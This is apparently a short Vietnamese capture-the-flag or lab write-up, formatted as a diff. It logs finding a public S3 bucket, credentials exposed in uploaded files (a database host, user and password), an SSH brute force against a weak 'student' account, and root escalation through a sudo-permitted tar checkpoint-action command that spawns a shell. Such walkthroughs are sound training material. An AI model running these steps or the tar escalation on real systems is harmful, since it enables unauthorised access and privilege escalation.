@@ -1,0 +1,26 @@
+Recon mục tiêu thấy đường dẫn amazonaws.com
+https://amzs-s3-bucket-v3.s3.us-east-1.amazonaws.com/
+ 
+Tìm thấy các file được đẩy lên 
+ 
+Thu tập được tài khoản 
+DB_HOST=db.wkrjfxeblmuqvctazdps.supabase.co
+DB_PORT=5432
+DB_NAME=postgres
+DB_USER=student_admin
+DB_PASSWORD=BackupPortal2026!
+Có vẻ không hợp lý khi dịch vụ không có database. Tiếp tục tìm kiếm
+ 
+Cảm giác phần gới ý là tài khoản student có mật khẩu yếu -> brute force ssh với user= student
+ 
+Thành công đăng nhập ssh. Truy cập leo thang mục tiêu
+ 
+ Recon về hệ thống
+ 
+Lấy thông về phiên bản HĐH, tên username
+Kiểm tra sudo -l
+ 
+Thấy cho phép sử dụng tar không bị dưới hạn tham số -> thử leo quyền bằng tar
+tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+ 
+ 
